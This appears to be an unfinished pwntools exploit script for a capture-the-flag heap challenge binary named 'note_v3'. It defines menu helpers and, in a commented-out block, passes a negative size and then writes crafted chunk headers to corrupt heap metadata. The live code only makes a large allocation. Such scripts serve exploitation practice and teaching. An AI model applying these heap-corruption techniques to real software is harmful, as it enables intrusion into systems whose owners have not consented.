from pwn import *
p = process("./note_v3")
elf = ELF("./note_v3")

def malloc(size, title, note):
    p.sendafter("> ", "1")
    p.sendafter("Size: ", str(size))
    p.sendafter("Title: ", title)
    if size != -1:
        p.sendafter("Note: ", note)

def edit(idx, data):
    p.sendafter("> ", "2")
    p.sendafter("Note: ", str(idx))
    p.sendafter("Data: ", data)


if __name__ == "__main__":
    '''
    malloc(-1, "a" * 4, "dummy")
    pause()
    edit(0, "a" * 8 + p64(0x31) + p64(0x0) * 5 + "\xb1\x0f\x00\x00\x00\x00")
    malloc(4096, "\x88", "b")
    '''
    malloc(0x100000, "a" * 4, "dummy")
    p.interactive()
